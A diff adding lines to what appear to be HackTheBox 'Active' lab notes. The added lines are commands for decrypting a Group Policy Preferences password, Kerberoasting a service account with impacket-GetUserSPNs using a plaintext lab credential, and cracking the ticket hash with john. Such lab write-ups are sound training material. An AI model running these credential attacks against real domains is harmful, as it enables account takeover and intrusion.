@@ -24,3 +24,11 @@ Sometime that hash can be cracked with ffollowing command:
 
 gpp-decrypt <hash-value> 
 
+Following command can be use to get the TGT of a user:
+
+impacket-GetUserSPNs  active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.129.95.193 -request
+
+Following command can be use to crack the obatined hash:
+
+john --wordlist=/usr/share/wordlists/rockyou.txt admin.txt
+
